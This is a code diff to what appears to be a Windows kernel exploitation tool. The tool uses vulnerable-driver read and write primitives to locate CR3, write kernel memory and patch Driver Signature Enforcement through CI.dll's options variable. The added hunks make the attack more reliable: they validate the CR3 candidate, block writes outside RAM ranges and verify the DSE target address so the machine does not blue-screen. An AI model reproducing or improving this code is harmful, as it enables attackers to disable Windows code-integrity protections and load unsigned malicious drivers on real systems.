@@ -691,6 +691,28 @@ static BOOL bootstrap_cr3(UINT64 ntoskrnl_kva) {
             return FALSE;
         }
         logf("[+] CR3=0x%016llX validated against ntoskrnl.",(unsigned long long)cr3_cand);
+    } else if(ntoskrnl_kva) {
+        /* ntoskrnl_phys not found (above 2GB scan range, or RAM ranges excluded it).
+           Alternative validation: walk cr3_cand page tables for ntoskrnl_kva and verify
+           the physical page contains an MZ header.  Prevents an unvalidated CR3 from a
+           false-positive EPROCESS scan reaching kwrite — root cause of IRQL_NOT_LESS. */
+        UINT64 ntos_pa = kva_to_phys(cr3_cand, ntoskrnl_kva);
+        if (ntos_pa) {
+            UINT64 mz = 0;
+            phys_read8(ntos_pa, &mz);
+            if ((mz & 0xFFFF) == 0x5A4D) {
+                logf("[+] CR3=0x%016llX alt-validated: MZ at phys=0x%016llX",
+                     (unsigned long long)cr3_cand, (unsigned long long)ntos_pa);
+            } else {
+                logf("[!] CR3=0x%016llX alt-validation failed (got 0x%04llX at ntos phys) — aborting.",
+                     (unsigned long long)cr3_cand, (unsigned long long)(mz & 0xFFFF));
+                return FALSE;
+            }
+        } else {
+            logf("[!] CR3=0x%016llX: kva_to_phys(ntoskrnl_kva) returned 0 — aborting.",
+                 (unsigned long long)cr3_cand);
+            return FALSE;
+        }
     }
 
     g_cr3          = cr3_cand;
@@ -723,6 +745,22 @@ static BOOL kwrite(UINT64 kva, UINT64 val, DWORD sz) {
     if(!pa) return FALSE;
     /* RMW: read 8 bytes, patch bytes [pa&7 .. pa&7+sz-1], write back */
     UINT64 aligned=pa&~7ULL;
+    /* Refuse writes to non-RAM physical addresses (MMIO/GPU BAR/page tables in
+       wrong-CR3 scenario).  If the RAM range table is populated, the target must
+       be inside a known RAM range.  Prevents IRQL_NOT_LESS_OR_EQUAL from writing
+       to a physical address that maps to a PTE or MMIO region at DISPATCH_LEVEL. */
+    if (g_nRanges > 0) {
+        BOOL inRam = FALSE;
+        for (int ri = 0; ri < g_nRanges; ri++)
+            if (aligned >= g_physRanges[ri].base &&
+                aligned <  g_physRanges[ri].base + g_physRanges[ri].len)
+                { inRam = TRUE; break; }
+        if (!inRam) {
+            logf("[!] kwrite: pa=0x%016llX not in RAM ranges — refusing write",
+                 (unsigned long long)aligned);
+            return FALSE;
+        }
+    }
     UINT64 qword=0;
     phys_read8(aligned,&qword);
     UINT32 shift=(UINT32)((pa&7)*8);
@@ -1277,6 +1315,23 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
 
     /* Primary: precise pattern scan — no kernel read, SMAP-safe */
     UINT64 kva = find_ci_options_precise(ci_base);
+
+    /* For physical backends, verify the precise result before trusting it.
+       If the CI.dll pattern changed on this Win11 build, the RIP-relative scan
+       might resolve to a stale/wrong RVA — kwrite to the wrong physical address
+       corrupts a page table entry → IRQL_NOT_LESS_OR_EQUAL at DISPATCH_LEVEL.
+       gdrv SMAP makes kread unreliable so skip verification there. */
+    if (kva && g_backend != BE_GDRV) {
+        UINT64 cur = 0;
+        if (!kread(kva, 1, &cur) || (cur != 0x06 && cur != 0x00)) {
+            logf("[!] precise: kva=0x%016llX kread=0x%02llX — unexpected, discarding",
+                 (unsigned long long)kva, (unsigned long long)cur);
+            kva = 0; /* fall through to AOB scan */
+        } else {
+            logf("[*] precise: kva=0x%016llX verified (val=0x%02llX)",
+                 (unsigned long long)kva, (unsigned long long)cur);
+        }
+    }
 
     /* Fallback: AOB scan.
      * For physical backends (LNV/TS): kread is reliable — verify the candidate holds
